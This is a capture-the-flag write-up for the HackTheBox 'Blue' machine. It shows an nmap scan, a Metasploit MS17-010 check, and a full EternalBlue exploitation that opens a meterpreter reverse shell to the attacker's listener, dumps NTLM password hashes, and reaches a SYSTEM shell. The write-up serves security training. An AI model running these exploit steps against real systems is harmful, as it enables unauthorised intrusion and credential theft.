# Blue | HackTheBox

### 1. Scan
```bash
─[us-dedivip-1]─[10.10.14.32]─[htb-jib1337@htb-iboxwtwj3a]─[~/writeups_public/HackTheBox/HTB_Blue]
└──╼ [★]$ sudo nmap -A -p- -T4 10.129.45.168
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-21 09:20 UTC
Nmap scan report for 10.129.45.168
Host is up (0.22s latency).
Not shown: 65526 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/21%OT=135%CT=1%CU=36196%PV=Y%DS=2%DC=T%G=Y%TM=5FB8D
OS:E19%P=x86_64-pc-linux-gnu)SEQ(SP=FC%GCD=1%ISR=110%TI=I%CI=I%II=I%SS=S%TS
OS:=7)OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M
OS:54DNW8ST11%O6=M54DST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=20
OS:00)ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y
OS:%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD
OS:=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0
OS:%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
OS:(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI
OS:=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3m18s, deviation: 2s, median: 3m16s
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-11-21T09:33:09+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-11-21T09:33:06
|_  start_date: 2020-11-21T09:19:34

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   216.51 ms 10.10.14.1
2   216.65 ms 10.129.45.168

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 545.42 seconds
```
The machine is running Windows 7 SP1 with SMB.

### 2. Check for vulnerabilities
Since Windows 7 SP1 is known to be vulnerable to the EternalBlue exploit, it can be quickly determined if the exploit is possible via metasploit.
```bash
msf5 auxiliary(scanner/smb/smb_ms17_010) > options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                                                 Required  Description
   ----         ---------------                                                 --------  -----------
   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS       10.129.45.168                                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT        445                                                             yes       The SMB service port (TCP)
   SMBDomain    .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                      no        The password for the specified username
   SMBUser                                                                      no        The username to authenticate as
   THREADS      1                                                               yes       The number of concurrent threads (max one per host)

msf5 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.129.45.168:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.129.45.168:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
The checker confirms the machine is likely vulnerable.

### 3. Get a system shell
```bash
msf5 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.129.45.168    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.32      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf5 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.32:4444 
[*] 10.129.45.168:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.45.168:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.129.45.168:445     - Scanned 1 of 1 hosts (100% complete)
[*] 10.129.45.168:445 - Connecting to target for exploitation.
[+] 10.129.45.168:445 - Connection established for exploitation.
[+] 10.129.45.168:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.129.45.168:445 - CORE raw buffer dump (42 bytes)
[*] 10.129.45.168:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.129.45.168:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.129.45.168:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.129.45.168:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.129.45.168:445 - Trying exploit with 12 Groom Allocations.
[*] 10.129.45.168:445 - Sending all but last fragment of exploit packet
[*] 10.129.45.168:445 - Starting non-paged pool grooming
[+] 10.129.45.168:445 - Sending SMBv2 buffers
[+] 10.129.45.168:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.129.45.168:445 - Sending final SMBv2 buffers.
[*] 10.129.45.168:445 - Sending last fragment of exploit packet!
[*] 10.129.45.168:445 - Receiving response from exploit packet
[+] 10.129.45.168:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.129.45.168:445 - Sending egg to corrupted connection.
[*] 10.129.45.168:445 - Triggering free of corrupted buffer.
[-] 10.129.45.168:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.129.45.168:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 10.129.45.168:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 10.129.45.168:445 - Connecting to target for exploitation.
[+] 10.129.45.168:445 - Connection established for exploitation.
[+] 10.129.45.168:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.129.45.168:445 - CORE raw buffer dump (42 bytes)
[*] 10.129.45.168:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.129.45.168:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.129.45.168:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.129.45.168:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.129.45.168:445 - Trying exploit with 17 Groom Allocations.
[*] 10.129.45.168:445 - Sending all but last fragment of exploit packet
[*] 10.129.45.168:445 - Starting non-paged pool grooming
[+] 10.129.45.168:445 - Sending SMBv2 buffers
[+] 10.129.45.168:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.129.45.168:445 - Sending final SMBv2 buffers.
[*] 10.129.45.168:445 - Sending last fragment of exploit packet!
[*] 10.129.45.168:445 - Receiving response from exploit packet
[+] 10.129.45.168:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.129.45.168:445 - Sending egg to corrupted connection.
[*] 10.129.45.168:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 10.129.45.168
[*] Meterpreter session 2 opened (10.10.14.32:4444 -> 10.129.45.168:49159) at 2020-11-21 09:47:17 +0000
[+] 10.129.45.168:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.45.168:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.45.168:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:cdf51b162460b7d5bc898f493751a0cc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
haris:1000:aad3b435b51404eeaad3b435b51404ee:8002bc89de91f6b52d518bde69202dc6:::
meterpreter > shell
Process 2500 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
